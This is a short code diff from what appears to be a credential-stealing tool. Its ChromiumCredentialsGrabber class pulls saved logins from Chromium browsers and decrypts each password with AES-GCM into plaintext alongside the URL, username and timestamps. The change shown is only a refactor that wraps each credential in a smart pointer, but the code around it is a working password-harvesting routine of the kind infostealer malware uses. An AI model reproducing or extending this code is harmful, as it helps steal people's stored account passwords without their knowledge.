@@ -11,7 +11,6 @@
 #include "Sql/InMemorySqliteDatabase.hpp"
 #include "Sql/SqliteRowIterator.hpp"
 #include "Utils/Buffer.hpp"
-#include "Utils/Environment.hpp"
 #include "Utils/Strings.hpp"
 
 #include <filesystem>
@@ -62,12 +61,14 @@ std::optional<Credentials> ChromiumCredentialsGrabber::grab_credentials() const
 			const Buffer plaintext_password = decrypt(encrypted_password, aes_key, iv, Aes::Mode::GCM);
 
 			credentials.emplace_back(
-				origin_url,
-				username_value,
-				Strings::to_wstring(Strings::to_string(plaintext_password)),
-				convert_datetime(date_created),
-				convert_datetime(date_accessed),
-				convert_datetime(date_modified)
+				std::make_unique<Credential>(
+					origin_url,
+					username_value,
+					Strings::to_wstring(Strings::to_string(plaintext_password)),
+					convert_datetime(date_created),
+					convert_datetime(date_accessed),
+					convert_datetime(date_modified)
+				)
 			);
 		}
 	}
